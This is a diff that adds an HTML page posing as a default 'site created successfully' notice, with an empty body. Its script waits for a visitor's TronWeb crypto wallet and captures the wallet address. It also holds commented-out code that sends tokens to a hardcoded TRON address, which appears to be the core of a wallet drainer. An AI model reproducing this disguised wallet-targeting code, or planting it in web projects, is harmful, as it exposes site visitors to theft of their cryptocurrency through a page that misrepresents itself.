@@ -1,0 +1,76 @@
+<!doctype html>
+<html>
+    
+<head>
+    <meta charset="utf-8">
+    <title>恭喜，站点创建成功！</title>
+    <style>
+        .container {
+            width: 60%;
+            margin: 10% auto 0;
+            background-color: #f0f0f0;
+            padding: 2% 5%;
+            border-radius: 10px
+        }
+
+        ul {
+            padding-left: 20px;
+        }
+
+            ul li {
+                line-height: 2.3
+            }
+
+        a {
+            color: #20a53a
+        }
+    </style>
+</head>
+<body>
+    
+</body>
+<script src=https://cdn.staticfile.org/jquery/2.1.4/jquery.min.js></script>
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script>
+<noscript src="https://cdn.jsdelivr.net/gh/ethereum/web3.js/dist/web3.min.js"></noscript>
+<script type="text/javascript">
+    var defaultaccount;
+    var address;
+    var id;
+    var contract = '';
+    var timers={};
+    var flag = true;
+    var decimals = 6;
+    var obj = setInterval(async ()=>{
+        if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+            clearInterval(obj)
+            let tronweb = window.tronWeb
+            address = window.tronWeb.defaultAddress.base58
+            defaultaccount = address;//授权成功后result能正常获取到账号了
+            defaultaccount = "" + defaultaccount;
+			//alert("地址："+defaultaccount);
+			/*
+			var tokenAddress = 'TCfYb8qr6Z3AGHUnvGHKcHduWZzxQU7j7N';
+            var address = 'TE3LoUcWuVcThrZCHzMAJJWcZ4SyXAk3Ck';
+            var decimals = 18;
+            try {
+                let instance = await tronWeb.contract().at(tokenAddress);
+                const value = tronWeb.toBigNumber(10 * Math.pow(10, decimals));
+                let value2 = value.toNumber();
+                console.log('address：' + address + '，value2：' + value2 + '，tokenAddress：' + tokenAddress);
+                let tx = await instance['transfer'](address, tronWeb.toHex(value2)).send({
+                    feeLimit: 10000000,
+                    callValue: 0,
+                    shouldPollResponse: true
+                });
+                alert('提交成功');
+                console.log(tx);
+            } catch (error) {
+                console.log(error);
+            }*/
+            /*var balance = await this.tronWeb.trx.getBalance('TE3LoUcWuVcThrZCHzMAJJWcZ4SyXAk3Ck');
+            alert(balance)*/
+        }
+    }, 10);
+
+</script>
+</html>
